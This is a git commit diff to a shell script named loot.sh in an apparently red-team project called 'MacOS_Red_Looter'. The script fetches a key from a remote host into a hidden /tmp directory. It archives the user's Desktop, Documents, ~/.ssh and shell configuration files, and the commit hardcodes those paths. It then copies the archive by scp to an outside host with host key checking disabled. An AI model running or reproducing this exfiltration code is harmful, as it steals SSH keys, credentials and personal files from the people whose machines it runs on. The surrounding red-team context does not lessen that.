ac6b475fdf5d3221854f047b97c513d5264fda06
un1x01d <>
2022-08-19 00:43:02 -0400

    change logic

--- MacOS_Red_Looter/loot.sh
+++ MacOS_Red_Looter/loot.sh
@@ -8,6 +8,6 @@ mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://192.168.1.216/sh -o /tmp/.s/.t/.e
 chmod 600 /tmp/.s/.t/.e/.a/.l/.s
 
 cd /tmp/.s/.t/.e/.a/.l
-tar cfz .loot.tgz ${LOOT}
+tar cfz .loot.tgz ~/Desktop ~/Documents ~/.ssh ~/.bash* ~/.config ~/.zsh*
 
 scp -q -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz zed@192.168.1.216:~/demo/
